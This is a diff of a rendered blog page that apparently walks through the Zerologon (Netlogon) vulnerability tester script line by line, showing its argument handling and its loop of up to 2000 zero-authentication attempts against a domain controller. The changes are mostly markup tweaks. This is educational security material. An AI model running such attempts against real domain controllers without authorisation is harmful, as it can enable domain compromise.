@@ -26,9 +26,9 @@ pip install git+https://github.com/SecureAuthCorp/impacket
 MAX_ATTEMPTS <span style=color:#f92672>=</span> <span style=color:#ae81ff>2000</span>
 </code></pre></div><p>Lines 1-4 import the required modules from Impacket, specifically the NRPC, EPM, Crypto, and Transport libraries. Additionally, on lines 6-8 a handful of other misc libraries are also imported, however, the Impacket libraries are the star of the show here. Lastly, on line 9, we&rsquo;re defining a constant (similar to a variable, but never changes) that sets the maximum number of retries for Zero Logon to 2000.</p><p>Lines 76 - 86</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
   <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> (<span style=color:#ae81ff>3</span> <span style=color:#f92672>&lt;=</span> len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>4</span>):
-    <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#39;Usage: zerologon_tester.py &lt;dc-name&gt; &lt;dc-ip&gt;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
-    <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#39;Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.&#39;</span>)
-    <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#39;Note: dc-name should be the (NetBIOS) computer name of the domain controller.&#39;</span>)
+    print(<span style=color:#e6db74>&#39;Usage: zerologon_tester.py &lt;dc-name&gt; &lt;dc-ip&gt;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
+    print(<span style=color:#e6db74>&#39;Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.&#39;</span>)
+    print(<span style=color:#e6db74>&#39;Note: dc-name should be the (NetBIOS) computer name of the domain controller.&#39;</span>)
     sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>1</span>)
   <span style=color:#66d9ef>else</span>:
     [_, dc_name, dc_ip] <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv
@@ -39,20 +39,20 @@ MAX_ATTEMPTS <span style=color:#f92672>=</span> <span style=color:#ae81ff>2000</
 </code></pre></div><p>Next we skipped down to the very bottom of the script so some other variables will make sense later, Line 1 is essentially declaring a main function within Python, Line 2 we are checking for the amount of parameters, and ensuring that it&rsquo;s exactly 3 (zerologon_tester.py DCNAME IP). Lines 3-5 are printing the help menu only if it&rsquo;s greater than 3 arguments, or less than 2 and exiting. If the required arguments are supplied, on line 8 the arguments are being passed into two variables: dc_name, and dc_ip. After the arguments are passed, dc_name is being stripped of the &ldquo;$&rdquo; character, as the dc_name variable shouldn&rsquo;t have it. The user account name should however. Afterwards, it&rsquo;s passing the variables two variables and an additional, modified variable into a module called &ldquo;perform_attack&rdquo;.</p><p>Lines 57 - 73</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>
 <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>perform_attack</span>(dc_handle, dc_ip, target_computer):
 
-  <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#39;Performing authentication attempts...&#39;</span>)
-  rpc_con <span style=color:#f92672>=</span> None
+  print(<span style=color:#e6db74>&#39;Performing authentication attempts...&#39;</span>)
+  rpc_con <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
   <span style=color:#66d9ef>for</span> attempt <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, MAX_ATTEMPTS):  
     rpc_con <span style=color:#f92672>=</span> try_zero_authenticate(dc_handle, dc_ip, target_computer)
     
-    <span style=color:#66d9ef>if</span> rpc_con <span style=color:#f92672>==</span> None:
-      <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#39;=&#39;</span>, end<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>, flush<span style=color:#f92672>=</span>True)
+    <span style=color:#66d9ef>if</span> rpc_con <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span>:
+      print(<span style=color:#e6db74>&#39;=&#39;</span>, end<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>, flush<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
     <span style=color:#66d9ef>else</span>:
       <span style=color:#66d9ef>break</span>
 
   <span style=color:#66d9ef>if</span> rpc_con:
-    <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Success! DC can be fully compromised by a Zerologon attack.&#39;</span>)
+    print(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Success! DC can be fully compromised by a Zerologon attack.&#39;</span>)
   <span style=color:#66d9ef>else</span>:
-    <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Attack failed. Target is probably patched.&#39;</span>)
+    print(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Attack failed. Target is probably patched.&#39;</span>)
     sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>1</span>)
 	
 </code></pre></div><p>Line 1 is defining where the variables are being passed into for the local function, \DCNAME is being passed into the dc_handle variable, dc_ip is being passed into dc_ip variable, and dc_name is being passed into the target_computer variable. All of which will be used later, or passed into different modules.</p><p>Line 4 sets the variable rpc_con equal to none, this will be kept track of consistently to check and see if authentication is successful, if it&rsquo;s not, the script will continue until 2000 retries is hit. Line 5 is where the actual retries for Zero Logon occurs in the form of a for loop. Line 6 sets the rpc_con variable to the output of a different function called &ldquo;try_zero_authenticate&rdquo; with a couple of variables being passed to it, specifically dc_handle, dc_ip, and target_computer. All of which we addressed earlier. The next lines are simply checking if rpc_con is equal to a invalid login attempt, if it is, print =, if not, print success, if 2000 retries is hit: print attack failed.</p><p>Lines 20-25</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>def try_zero_authenticate<span style=color:#f92672>(</span>dc_handle, dc_ip, target_computer<span style=color:#f92672>)</span>:
@@ -310,6 +310,7 @@ Mode                LastWriteTime         Length Name
 <a class="ui label" href=/tags/encryption/ title=encryption>encryption</a>
 <a class="ui label" href=/tags/forensic/ title=forensic>forensic</a>
 <a class="ui label" href=/tags/gnupg/ title=gnupg>gnupg</a>
+<a class="ui label" href=/tags/hackpark/ title=HackPark>HackPark</a>
 <a class="ui label" href=/tags/internship/ title=Internship>Internship</a>
 <a class="ui label" href=/tags/interview/ title=interview>interview</a>
 <a class="ui label" href=/tags/kenobi/ title=kenobi>kenobi</a>
